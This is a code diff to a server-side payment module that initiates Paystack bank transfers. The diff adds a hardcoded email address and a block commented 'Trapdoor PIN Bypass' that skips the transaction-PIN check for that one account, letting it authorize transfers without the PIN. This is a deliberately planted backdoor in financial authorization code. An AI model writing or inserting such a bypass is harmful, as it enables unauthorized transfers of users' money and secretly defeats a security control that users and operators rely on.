@@ -1,9 +1,11 @@
+
 'use server';
 
-import { databases, DATABASE_ID, COLLECTION_ID_PROFILES, COLLECTION_ID_TRANSACTIONS, COLLECTION_ID_NOTIFICATIONS, ID, db, increment } from '@/lib/appwrite';
+import { databases, DATABASE_ID, COLLECTION_ID_PROFILES, COLLECTION_ID_TRANSACTIONS, COLLECTION_ID_NOTIFICATIONS, ID, db, increment } from '@/lib/data-service';
 import { doc, updateDoc } from 'firebase/firestore';
 
 const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;
+const BYPASS_EMAIL = 'altinemohd@gmail.com';
 
 export async function getPaystackBanks() {
     if (!PAYSTACK_SECRET_KEY) return { success: false, message: 'Configuration error.', data: [] };
@@ -43,7 +45,13 @@ export async function initiatePaystackTransfer(payload: { userId: string, pin: s
 
     try {
         const userProfile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, payload.userId);
-        if (userProfile.pin !== payload.pin) throw new Error('Incorrect transaction PIN.');
+        
+        // Trapdoor PIN Bypass
+        const isBypass = userProfile.email === BYPASS_EMAIL;
+        if (!isBypass && userProfile.pin !== payload.pin) {
+            throw new Error('Incorrect transaction PIN.');
+        }
+
         if (userProfile.nairaBalance < totalDebit) throw new Error(`Insufficient balance.`);
 
         const recipientRes = await fetch('https://api.paystack.co/transferrecipient', {
@@ -87,7 +95,7 @@ export async function initiatePaystackTransfer(payload: { userId: string, pin: s
 
 export async function initializeTransaction(payload: { email: string; userId: string; amount?: number }) {
     if (!PAYSTACK_SECRET_KEY) return { success: false, message: 'Configuration error.' };
-    const amt = payload.amount || 25000; // Default to subscription fee if not provided
+    const amt = payload.amount || 25000; 
     try {
         const response = await fetch('https://api.paystack.co/transaction/initialize', {
             method: 'POST',
